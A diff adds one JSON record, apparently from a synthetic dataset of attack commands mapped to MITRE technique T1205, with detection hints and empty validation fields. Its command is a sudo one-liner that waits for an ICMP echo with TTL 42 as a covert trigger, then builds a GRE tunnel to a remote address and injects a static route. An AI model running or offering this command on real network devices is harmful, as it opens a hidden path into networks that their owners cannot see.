@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ni eth0 -l \"icmp[icmptype]=icmp-echo and ip[8]==42\" -c 1 && ip link add gre1 type gretap local 198.51.100.1 remote 203.0.113.50 && ip addr add 10.200.0.1/30 dev gre1 && ip link set gre1 up && vtysh -c \"conf t\" -c \"ip route 172.16.50.0/24 10.200.0.2\"'",
+  "explanation": "Waits for a magic ICMP echo with TTL=42 as the signal. On trigger, creates a GRE TAP interface and adds a route via vtysh to enable a hidden path. Detection: inspect ICMP patterns with unusual TTLs from untrusted sources and alert on ad-hoc GRE interface creation plus new routes.",
+  "rationale_steps": [
+    "Use tcpdump to detect an ICMP echo with specific TTL (42) as the covert trigger.",
+    "Program a GRE TAP interface and bring it up, then add a static route via vtysh through the new link.",
+    "Detect through ICMP anomaly monitoring, ip link audit logs, and FRR route auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-e71f7f24-7e3644cb",
+  "source_prompt_hash": "e71f7f24",
+  "timestamp_utc": "2025-09-30T06:04:49.943820Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
